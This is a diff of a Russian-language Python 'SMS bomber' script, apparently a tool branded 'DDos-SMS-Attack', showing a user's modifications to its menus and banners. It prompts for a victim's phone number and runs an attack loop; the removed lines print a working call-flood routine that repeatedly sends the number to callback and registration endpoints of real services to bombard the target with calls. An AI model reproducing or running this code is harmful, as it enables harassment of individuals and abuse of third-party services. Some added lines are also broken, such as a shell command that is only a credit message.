@@ -17,14 +17,13 @@ init()
 
 #Баннер старта 
 os.system("clear")
-os.system("CLS")
+os.system("Bomber was modified by Murat")
 start()
 input()
 
 
 #Баннер cПАМЕРА
 os.system("clear")
-os.system("CLS")
 
 if oso == "posix":
     banner1an()
@@ -43,59 +42,55 @@ message8 = """    \n         Разработчики:
                   \n                                      
                   \n Создатель идеи/Разработчик:
                   \n \033[94mИван Зайцев\033[0m - https://vk.com/ivan_vzlom300 
-                  \n                                      
+                  \n       
+                  Модифицировано Муратом\n                               
                   \n \033[33mНад визуальными эффектами\Анимации работали:\033[0m 
                   \n \033[94mДима Чернышов\033[0m - https://vk.com/psih.odinochka  
                   \n                                      
                                                                       """
 
+def settings ():
+	
+	
+	if True:
+	    print(Fore.GREEN)
+	    print("\n          [НАСТРОЙКИ] ")
+	    print("\n \033[94m[0] Разработчики \033[0m                             ")
+	    print("\n \033[32m[1] Настройка времени показа баннера (в сек.)\033[0m  ")
+	    print("\n \033[32m[2] Выйти\033[0m ")
+	    time.sleep(2)
+	    print(Fore.GREEN)
+	    p = input("\n [>>] ")
+	    
+	    if p == str(1):
+	        kol2 =  input("\n Хорошо введите время не больше 20 секунд !>> ")
+	        for char in message1:
+	            sys.stdout.write(char)
+	            sys.stdout.flush()
+	            time.sleep(0.01)
+	        p = input("\n Что бы выйти напишите (2) >> ")
+	
+	    if p == str(0):
+	        print(Fore.YELLOW)
+	        for char in message8:
+	            sys.stdout.write(char)
+	            sys.stdout.flush()
+	            time.sleep(0.01)
+	        print(Fore.GREEN)
+	        p = input("\n Что бы выйти напишите (2) >> ")
+	
+	    if p == str(2):
+	        os.system("clear")
+	        os.system("CLS")
+	        print("Модифицировано Муратом")
+	        if oso == "posix":
+	            banner3()
+	        else:
+	            banner4()
+	
 
-print(Fore.GREEN)
-time.sleep(1)
-E = input("\n Хотите попасть в настройки ? [1-(Yes)/\033[31m2-(No)\033[0m\033[32m]>>\033[94m")
-if E == str(1):
-    print(Fore.GREEN)
-    print("\n          [НАСТРОЙКИ] ")
-    print("\n \033[94m[0] Разработчики \033[0m                             ")
-    print("\n \033[32m[1] Настройка времени показа баннера (в сек.)\033[0m  ")
-    print("\n \033[32m[2] Выйти\033[0m ")
-    time.sleep(2)
-    print(Fore.GREEN)
-    p = input("\n [>>] ")
-    
-    if p == str(1):
-        kol2 =  input("\n Хорошо введите время не больше 20 секунд !>> ")
-        for char in message1:
-            sys.stdout.write(char)
-            sys.stdout.flush()
-            time.sleep(0.01)
-        p = input("\n Что бы выйти напишите (2) >> ")
-
-    if p == str(0):
-        print(Fore.YELLOW)
-        for char in message8:
-            sys.stdout.write(char)
-            sys.stdout.flush()
-            time.sleep(0.01)
-        print(Fore.GREEN)
-        p = input("\n Что бы выйти напишите (2) >> ")
-
-    if p == str(2):
-        os.system("clear")
-        os.system("CLS")
-        if oso == "posix":
-            banner3()
-        else:
-            banner4()
-
-if E == str(2):
-    os.system("clear")
-    os.system("CLS")
-    if oso == "posix":
-        banner3()
-    else:
-        banner4()
-
+	
+	
 
 def banner_atack2():
   print(Fore.GREEN)
@@ -123,6 +118,12 @@ def banner_atack2():
     time.sleep(0.01)
 
 
+call = input("\n \033[31mTип атаки (1 - Настройки , 2 -Атака СМС)>\033[0m\033[94m")
+if call == str(1):
+    os.system("clear")
+    os.system("CLS")
+
+    settings()
 
 
 
@@ -150,8 +151,8 @@ def banner_atack():
 
 
 R = 0
-message7 = "\033[94m \n ЧТо бы вЫйти из прОграМмы нАжмиТе Ctrl + C ! \033[0m"
-message5 = "\033[94m \n ЧТо бы вЫйти из прОграМмы нАжмиТе Ctrl + C иЛи на КРЕСТИК в пРавоМ верХнем угЛу. \033[0m"
+message7 = "\033[94m \n ЧТо бы вЫйти из прОграМмы нАжмиТе Ctrl + D ! \033[0m"
+message5 = "\033[94m \n ЧТо бы вЫйти из прОграМмы нАжмиТе Ctrl + D иЛи на КРЕСТИК в пРавоМ верХнем угЛу. \033[0m"
 if oso == "posix":
     for char in message7:
         sys.stdout.write(char)
@@ -164,7 +165,7 @@ else:
         sys.stdout.flush()
         time.sleep(0.01)
 
-print(Fore.RED)
+print(Fore.CYAN)
 _phone = input('\n \033[31mВвEди-те ноMер (Без +)>\033[0m\033[94m')
 message4 =  "Атака началась на ||" + str(_phone)+ "||\033[94mDDos-SMS-Attack\033[0m"
 
@@ -185,56 +186,6 @@ if kol == str(0):
     kol = 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
 start_time = time.time() 
 CLOSE_AFTER = kol
-call = input("\n \033[31mTип атаки (1 - Атака звонками , 2 -Атака СМС)>\033[0m\033[94m")
-if call == str(1):
-    os.system("clear")
-    os.system("CLS")
-
-    if oso == "posix":
-        banner_atack2()
-    else:
-        banner_atack()
-    
-    while True:      	
-      if time.time() > start_time + float(CLOSE_AFTER): 
-        print(Fore.RED)
-        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-        break
-      try:
-        requests.post('https://my.zadarma.com/connect/', params={"?number=": '+' + _phone})
-        print(Fore.GREEN)
-        print('[+] zadarma звонок отправлен!')
-      except:
-        print(Fore.RED)
-        print('[-] Не удалось отправить запрос на звонок! (zadarma) ')
-
-      if time.time() > start_time + float(CLOSE_AFTER):
-        print(Fore.RED)
-        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-        break
-      try:
-        requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
-        print(Fore.GREEN)
-
-        print('[+] findclone звонок отправлен!')
-      except:
-        print(Fore.RED)
-        print('[-] Не удалось отправить запрос на звонок! (findclone)')
-
-      if time.time() > start_time + float(CLOSE_AFTER):
-        print(Fore.RED)
-        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-        break
-
-      try:
-        requests.post('https://msk.dostaevsky.ru/ajax/feedback/', params={"back_call": '+' + _phone})
-        print(Fore.GREEN)
-        print('[+] dostaevsky звонок отправлен!')
-      except:
-        print(Fore.RED)
-        print('[-] Не удалось отправить запрос на звонок! (dostaevsky)')
-      time.sleep(0.8)
-
 
 
 
@@ -243,6 +194,7 @@ if call == str(2):
     CLOSE_AFTER = kol
     os.system("clear")
     os.system("CLS")   
+    print("Модифицировано Муратом")
     if oso == "posix":
         banner_atack2()
     else:
